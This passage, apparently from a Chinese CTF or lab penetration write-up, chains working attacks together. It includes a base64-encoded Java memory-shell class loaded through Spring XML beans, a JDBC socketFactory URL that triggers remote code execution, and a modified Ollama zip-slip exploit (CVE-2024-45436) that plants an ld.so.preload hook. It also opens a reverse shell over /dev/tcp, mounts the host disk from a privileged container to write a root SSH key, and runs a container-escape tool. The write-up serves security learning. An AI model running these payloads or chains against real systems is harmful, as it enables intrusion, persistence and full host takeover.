                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>yv66vgAAADIBOwEASG9yZy9hcGFjaGUvYmVhbnV0aWxzL2NveW90ZS91dGlsL1R5cGVLZXk1YmU4NWI4MGI0OTE0OTc4OWQ3NzA4MmE3ZTUxYTFjNgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAHDAAFAAYKAAQACQEAA3J1bgwACwAGCgACAAwBABBnZXRSZXFIZWFkZXJOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAA9YLUF1dGhvcml6YXRpb24IABABAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HABIBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwAUAQAQamF2YS9sYW5nL1RocmVhZAcAFgEACmdldFRocmVhZHMIABgBAA9qYXZhL2xhbmcvQ2xhc3MHABoBABJbTGphdmEvbGFuZy9DbGFzczsHABwBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB4AHwoAGwAgAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAiAQANc2V0QWNjZXNzaWJsZQEABChaKVYMACQAJQoAIwAmAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAAoACkKACMAKgEAE1tMamF2YS9sYW5nL1RocmVhZDsHACwBAAdnZXROYW1lDAAuAA8KABcALwEABGh0dHAIADEBABBqYXZhL2xhbmcvU3RyaW5nBwAzAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMADUANgoANAA3AQAIQWNjZXB0b3IIADkBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMADsAPAoABAA9AQAGdGFyZ2V0CAA/AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAQQBCCgAbAEMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcARQoARgAmAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAEgASQoARgBKAQAIZW5kcG9pbnQIAEwBAAZ0aGlzJDAIAE4BAAdoYW5kbGVyCABQAQANZ2V0U3VwZXJjbGFzcwwAUgA8CgAbAFMBAAZnbG9iYWwIAFUBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMAFcAWAoAGwBZAQAib3JnLmFwYWNoZS5jb3lvdGUuUmVxdWVzdEdyb3VwSW5mbwgAWwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcAXQEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAF8AYAoAXgBhCgAbAC8BAApwcm9jZXNzb3JzCABkAQATamF2YS91dGlsL0FycmF5TGlzdAcAZgEABHNpemUBAAMoKUkMAGgAaQoAZwBqAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABIAGwKAGcAbQEAA3JlcQgAbwEAB2dldE5vdGUIAHEBABFqYXZhL2xhbmcvSW50ZWdlcgcAcwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAdQB2CQB0AHcBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwAeQB6CgB0AHsBAAlnZXRIZWFkZXIIAH0BAAlnZXRNZXRob2QMAH8AHwoAGwCADAAOAA8KAAIAggEAC2dldFJlc3BvbnNlCACEAQAJZ2V0V3JpdGVyCACGAQAOamF2YS9pby9Xcml0ZXIHAIgBAAZoYW5kbGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAigCLCgACAIwBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAjgCPCgCJAJABAAVmbHVzaAwAkgAGCgCJAJMBAAVjbG9zZQwAlQAGCgCJAJYBAARleGVjAQAHb3MubmFtZQgAmQEAEGphdmEvbGFuZy9TeXN0ZW0HAJsBAAtnZXRQcm9wZXJ0eQwAnQCLCgCcAJ4BAAt0b0xvd2VyQ2FzZQwAoAAPCgA0AKEBAAN3aW4IAKMBAAcvYmluL3NoCAClAQACLWMIAKcBAAdjbWQuZXhlCACpAQACL2MIAKsBABFqYXZhL2xhbmcvUnVudGltZQcArQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAK8AsAoArgCxAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAmACzCgCuALQBABFqYXZhL2xhbmcvUHJvY2VzcwcAtgEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsMALgAuQoAtwC6AQARamF2YS91dGlsL1NjYW5uZXIHALwBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMAAUAvgoAvQC/AQACXGEIAMEBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAMMAxAoAvQDFAQAACADHAQAHaGFzTmV4dAEAAygpWgwAyQDKCgC9AMsBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAzQoAzgAJAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7DADQANEKAM4A0gEABG5leHQMANQADwoAvQDVAQAIdG9TdHJpbmcMANcADwoAzgDYAQAKZ2V0TWVzc2FnZQwA2gAPCgAIANsBABNbTGphdmEvbGFuZy9TdHJpbmc7BwDdAQATamF2YS9pby9JbnB1dFN0cmVhbQcA3wEABmV5SmVYQQgA4QEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoMAOMA5AoANADlAQAGbGVuZ3RoDADnAGkKADQA6AEABmNoYXJBdAEABChJKUMMAOoA6woANADsAQAVKEMpTGphdmEvbGFuZy9TdHJpbmc7DAB5AO4KADQA7wEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJDADxAPIKAHQA8wEAAS4IAPUBAAdpbmRleE9mDAD3APIKADQA+AEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsMAPoA+woANAD8AQAMYmFzZTY0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<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>

            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>classLoader<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javax.management.loading.MLet<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clazz<span class="token punctuation">"</span></span> <span class="token attr-name">factory-bean</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>classLoader<span class="token punctuation">"</span></span> <span class="token attr-name">factory-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>defineClass<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>decoder<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5111<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">factory-bean</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clazz<span class="token punctuation">"</span></span> <span class="token attr-name">factory-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>newInstance<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span>
------WebKitFormBoundaryTybnkzTPpCAPkAti</code></pre>

<p>æœ€åæ„é€  JDBC URL å®ä¾‹åŒ–ä¸´æ—¶é©»ç•™çš„ <span class="hexo-wm">ğ˜€â€Œâ€ŒÂ³vï½…ï½.â€ï»¿êœ±ğ˜ªâ€ï½”ğ˜¦â€</span>xml bean è§¦å‘å›æ˜¾ RCE è·å¾— flagï¼š</p>
<pre class="language-none"><code class="language-none">jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=file://${catalina.home}/work/Tomcat/localhost/ROOT/*.tmp</code></pre>

<h3 id="4-ollama"><a href="#4-ollama" class="headerlink" title="4. ollama"></a>4. ollama</h3><pre class="language-none"><code class="language-none">172.22.10.17:11434 å­˜åœ¨ ollama æœåŠ¡</code></pre>

<p>å…ˆæŸ¥çœ‹ä¸€ä¸‹ o<span class="hexo-wm">sâ€ŒÂ³ğ˜·ï½…ğ˜¯â€¢â€‹Ñ•ğ¢â€‹ğ’•ï½…â€â€</span>llama çš„ç‰ˆæœ¬</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://172.22.10.17:11434/api/version

<span class="token punctuation">{</span><span class="token string">"version"</span><span class="token builtin class-name">:</span><span class="token string">"0.1.46"</span><span class="token punctuation">}</span></code></pre>

<p>ç‰ˆæœ¬å·ä¸º 0.1.46ï¼Œå­˜åœ¨ <a href="https://xz.aliyun.com/news/17826">Zip Slip æ¼æ´</a>ï¼Œä½†æ˜¯è¯¥æ¼æ´éœ€è¦å…ˆæœ‰ä¸€ä¸ªå¯ç”¨æ¨¡å‹æ‰èƒ½è§¦å‘</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://172.22.10.17:11434/api/tags

<span class="token punctuation">{</span><span class="token string">"models"</span>:<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre>

<p>è¿œç¨‹æ²¡æœ‰å‘ç°å¯ç”¨æ¨¡å‹ï¼Œä¸”é¶æœºæ²¡æœ‰ç½‘æ— æ³• pull <span class="hexo-wm">ğ¬â€â€â‘¶ğ’—â„¯ğ§Â·â€‹â€ğ˜´ï½‰â€Œâ€ğ­ï½…â€â€Œ</span>æ¨¡å‹ï¼Œéœ€è¦æœ¬åœ°ä¸Šä¼ æ¨¡å‹æ¥è§¦å‘æ¼æ´</p>
<p>ä½¿ç”¨ <a href="https://github.com/srcx404/CVE-2024-45436">Ollama CVE-2024-45436 Exploit</a>ï¼Œä¿®æ”¹ä¸ºæœ¬åœ°ä¸Šä¼  gguf <span class="hexo-wm">êœ±ï»¿â‘¶ğ¯ï½…ğ˜¯.â€êœ±iâ€ï½”ğâ€â€Œ</span>ç„¶åæ‰‹åŠ¨ create æ¨¡å‹ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python">    <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'evil.zip'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipf<span class="token punctuation">:</span>
        zipf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">'../../../../../../../../../../etc/ld.so.preload'</span><span class="token punctuation">,</span> <span class="token string">'/tmp/hook.so'</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'hook.so'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> so_file<span class="token punctuation">:</span>
            zipf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">'../../../../../../../../../../tmp/hook.so'</span><span class="token punctuation">,</span> so_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">+</span>		<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'all-minilm-22m.gguf'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> model_file<span class="token punctuation">:</span>
<span class="token operator">+</span>			zipf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">'../../../../../../../../../../tmp/all-minilm-22m.gguf'</span><span class="token punctuation">,</span> model_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token operator">-</span>	json_content <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span> model<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token operator">+</span>	json_content <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"all-minilm:22m"</span><span class="token punctuation">,</span> <span class="token string">"modelfile"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"FROM /tmp/all-minilm-22m.gguf"</span></span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
<span class="token operator">-</span>		<span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>target_url<span class="token punctuation">}</span></span><span class="token string">/api/pull"</span></span><span class="token punctuation">,</span> 
<span class="token operator">+</span>		<span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>target_url<span class="token punctuation">}</span></span><span class="token string">/api/create"</span></span><span class="token punctuation">,</span>
        headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
        data<span class="token operator">=</span>json_content<span class="token punctuation">,</span>
<span class="token operator">-</span>		timeout<span class="token operator">=</span><span class="token number">120</span>  <span class="token comment"># Allow longer timeout for model pull</span>
<span class="token operator">+</span>		timeout<span class="token operator">=</span><span class="token number">10</span>
    <span class="token punctuation">)</span></code></pre>

<p>è·‘ exp åå¼¹<span class="hexo-wm">ğ¬â€Œ3veğ’ï¼ï»¿êœ±ğ˜ªï»¿â€‹ğ­ï½…â€‹â€‹</span> shellï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">proxychains python3 exp.py http://172.22.10.17:11434 <span class="token string">"/bin/sh -i &gt;&amp; /dev/tcp/172.22.10.22/8083 0&gt;&amp;1"</span></code></pre>

<p>æ‹¿åˆ° shell <span class="hexo-wm">ğ˜´â€ï»¿ğŸ¯ğ˜·ï½…nÂ·â€Œâ€ğ˜€ğ˜ªâ€‹ğ˜µğâ€â€‹</span>ä¹‹åå‘ç°å­˜åœ¨ <code>.dockerenv</code>ï¼Œåˆ¤æ–­å½“å‰æ˜¯åœ¨ docker é‡Œï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> <span class="token parameter variable">-la</span> /

-rwxr-xr-x   <span class="token number">1</span> root root    <span class="token number">0</span> Jul <span class="token number">14</span> 05:23 .dockerenv</code></pre>

<p>æŸ¥çœ‹ docker<span class="hexo-wm">êœ±â€ŒÂ³venâˆ™â€‹ğ’”iâ€Œï»¿ğ˜µï½…â€‹ï»¿</span> å®¹å™¨æƒé™ï¼š</p>
<pre class="language-none"><code class="language-none">$ grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb):|Seccomp:' /proc/self/status

CapInh:	0000000000000000
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
Seccomp:	0</code></pre>

<p>å‘ç°å½“å‰å®¹å™¨ä¸ºç‰¹æƒå®¹å™¨ï¼Œç›´æ¥æŒ‚è½½å®¿ä¸»æœºæ ¹ç›®å½•å¹¶å†™å…¥ ssh keyï¼š</p>
<pre class="language-none"><code class="language-none">$ lsblk -f

NAME   FSTYPE FSVER LABEL UUID FSAVAIL FSUSE% MOUNTPOINTS
vda                                           
|-vda1                                        
|-vda2                                        
`-vda3                           32.2G    13% /etc/hosts
                                              /etc/hostname
                                              /etc/resolv.conf
                                              /root/.ollama

$ mkdir /test &amp;&amp; mount /dev/vda3 /test
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdsRDDmr8YmYWyHqAnpDB46G3F9+nr6zhPxzfOQTJJ+" &gt; /test/root/.ssh/authorized_keys</code></pre>

<p>è¿™é‡Œä¹Ÿå¯ä»¥ä¼ ä¸€ä¸ª cdk <span class="hexo-wm">sï»¿â€‹Â³ven.â€êœ±ï½‰â€Œâ€‹ğ’•eï»¿</span>æ¥è‡ªåŠ¨åŒ–é€ƒé€¸ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">+</span>	<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'cdk_linux_amd64'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cdk_file<span class="token punctuation">:</span>
<span class="token operator">+</span>		zipf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">'../../../../../../../../../../tmp/cdk'</span><span class="token punctuation">,</span> cdk_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x /tmp/cdk
/tmp/cdk auto-escape <span class="token string">"echo 'ZWNobyAic3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSURkc1JERG1yOFltWVd5SHFBbnBEQjQ2RzNGOStucjZ6aFB4emZPUVRKSisiID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXM=' | base64 -d | bash"</span>

all exploits are finished, auto exploit success<span class="token operator">!</span></code></pre>

<p>ssh ç™»å½•åæŸ¥çœ‹ç½‘å¡ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Ollama:~<span class="token comment"># ifconfig</span>
docker0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">&gt;</span>  mtu <span class="token number">1500</span>
        inet <span class="token number">172.17</span>.0.1  netmask <span class="token number">255.255</span>.0.0  broadcast <span class="token number">172.17</span>.255.255
        inet6 fe80::42:2cff:fecb:7254  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">&gt;</span>
        ether 02:42:2c:cb:72:54  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">16073</span>  bytes <span class="token number">858401</span> <span class="token punctuation">(</span><span class="token number">858.4</span> KB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">23199</span>  bytes <span class="token number">415329894</span> <span class="token punctuation">(</span><span class="token number">415.3</span> MB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">&gt;</span>  mtu <span class="token number">1500</span>
        inet <span class="token number">172.22</span>.10.17  netmask <span class="token number">255.255</span>.255.0  broadcast <span class="token number">172.22</span>.10.255
        inet6 fe80::216:3eff:fe10:d9d4  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">&gt;</span>
        ether 00:16:3e:10:d9:d4  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">502671</span>  bytes <span class="token number">458217126</span> <span class="token punctuation">(</span><span class="token number">458.2</span> MB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">231109</span>  bytes <span class="token number">13688236</span> <span class="token punctuation">(</span><span class="token number">13.6</span> MB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

eth1: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">&gt;</span>  mtu <span class="token number">1500</span>
        inet <span class="token number">172.22</span>.20.11  netmask <span class="token number">255.255</span>.255.0  broadcast <span class="token number">172.22</span>.20.255
        inet6 fe80::216:3eff:fe10:d9e5  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">&gt;</span>
        ether 00:16:3e:10:d9:e5  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
